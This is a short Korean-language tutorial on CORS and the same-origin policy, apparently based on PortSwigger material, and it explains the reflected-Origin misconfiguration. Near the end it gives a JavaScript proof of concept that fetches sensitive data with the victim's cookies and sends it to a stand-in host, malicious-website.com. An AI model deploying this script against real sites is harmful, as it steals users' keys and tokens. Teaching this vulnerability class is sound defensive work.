# Cross-Origin Resource Sharing

**CORS**(Cross-Origin Resource Sharing)는 지정된 도메인 외부에 위치한 리소스에 대한 제어된 액세스를 가능하게 하는 브라우저 메커니즘이다. 이것은 동일 출처 정책(same-origin policy, SOP)에 유연성을 확장하고 추가한다. 하지만 웹사이트의 CORS 정책이 제대로 구현 및 구성되지 않은 경우, 도메인 간 공격(cross-domain based attacks)에 대한 가능성도 제공한다. CORS는 CSRF와 같은 출처 간 공격에 대한 보호가 아니다.

## Same-origin policy (SOP)
동일 출처 정책은 웹사이트가 소스 도메인 외부의 리소스와 상호 작용하는 기능을 제한하는 제한적인 교차 출처 사양(cross-origin specification)이다. SOP는 한 웹사이트가 다른 웹사이트로부터 개인 데이터를 훔치는 것과 같은 잠재적으로 악의적인 도메인 간 상호 작용에 대응하여 수년 전에 정의되었다. 일반적으로 도메인이 다른 도메인으로 요청을 발행하는 것은 허용하지만, 응답에 액세스하는 것은 허용하지 않는다.

SOP는 매우 제한적이며 결과적으로 제약 조건을 회피하기 위해 다양한 접근 방법이 고안되었다. 많은 웹사이트들이 전체 교차 출처 액세스(full cross-origin access)가 필요한 방식으로 서브 도메인 또는 서드파티 사이트와 상호 작용한다. CORS를 사용하여 SOP의 통제된 완화가 가능하다.

CORS 프로토콜은 신뢰할 수 있는 웹 출처와 인증된 액세스 허용 여부와 같은 관련 속성을 정의하는 HTTP 헤더 세트를 사용한다. 이들은 브라우저와 접속을 시도하는 교차 출처 웹사이트 사이의 헤더 교환으로 결합된다.

## Vulnerabilities
일부 애플리케이션은 여러 다른 도메인에 대한 액세스를 제공해야 한다. 실수로 인해 기능이 손상될 위험이 있기 때문에 허용된 도메인 목록을 유지하기 위해서는 지속적인 관리가 필요하다. 따라서 일부 애플리케이션은 다른 도메인에서 효과적으로 액세스 할 수 있는 쉬운 경로를 택한다.

이를 수행하는 한 가지 방법은 요청으로부터 `Origin` 헤더를 읽고 요청하는 출처가 허용되는 것을 나타내는 응답 헤더를 포함시키는 것이다.

```http
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```

위의 예시는 요청과 이에 대한 응답을 보여준다. 이 헤더는 요청한 도메인에서 액세스가 허용되고 도메인 간 요청에 쿠키가 포함될 수 있으며 세션 내에 처리될 수 있음을 나타낸다.

애플리케이션은 `Access-Control-Allow-Origin` 헤더에 임의의 출처를 반영하기 때문에 모든 도메인이 취약한 도메인의 리소스에 액세스 할 수 있음을 의미한다. 만약 응답에 API Key 또는 CSRF 토큰과 같은 민감한 정보가 포함된다면 웹사이트에 아래의 스크립트를 배치하여 이러한 정보를 검색할 수 있다.

```js
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='//malicious-website.com/log?key='+this.responseText;
};
```

## References
- https://portswigger.net/web-security/cors